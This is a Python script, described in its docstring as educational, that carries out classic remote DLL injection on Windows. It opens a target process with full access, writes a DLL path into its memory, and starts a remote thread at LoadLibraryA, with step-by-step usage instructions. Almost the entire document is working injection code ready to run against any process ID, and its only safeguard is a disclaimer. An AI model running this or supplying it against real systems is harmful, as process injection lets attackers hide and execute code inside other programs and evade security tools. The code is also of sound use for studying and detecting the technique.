"""
Remote DLL Injection Script
This script demonstrates the technique of remotely injecting a DLL into a process on Windows.
It is intended solely for educational purposes and should be used in a controlled, legal, and ethical environment.

Usage:
- Ensure you have Python and necessary permissions on the Windows system.
- Update the 'dll_path' with the actual path of the DLL to inject.
- Update the 'target_pid' with the actual PID of the target process.
- Run the script in a Python environment with the necessary privileges.

"""

from ctypes import *
from ctypes import wintypes

# Define Windows API shorthand and types
kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

# Define function prototypes for better error handling
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR,)
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, POINTER(wintypes._SECURITY_ATTRIBUTES), SIZE_T, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.DWORD))
CreateRemoteThread.restype = wintypes.HANDLE

# Constants for memory allocation and process access
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

# Target DLL and process
dll_path = b"C:\\path\\to\\hello_world.dll"  # Update with the actual DLL path
target_pid = 1234  # Update with the actual target PID

# Perform DLL injection
try:
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
    if not process_handle:
        raise WinError()

    remote_memory = VirtualAllocEx(process_handle, None, len(dll_path) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not remote_memory:
        raise WinError()

    if not WriteProcessMemory(process_handle, remote_memory, dll_path, len(dll_path) + 1, None):
        raise WinError()

    load_library_addr = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
    if not load_library_addr:
        raise WinError()

    remote_thread = CreateRemoteThread(process_handle, None, 0, load_library_addr, remote_memory, 0, None)
    if not remote_thread:
        raise WinError()

    print(f"Injected DLL into process. Handle: {remote_thread}")

except Exception as e:
    print(f"An error occurred: {e}")
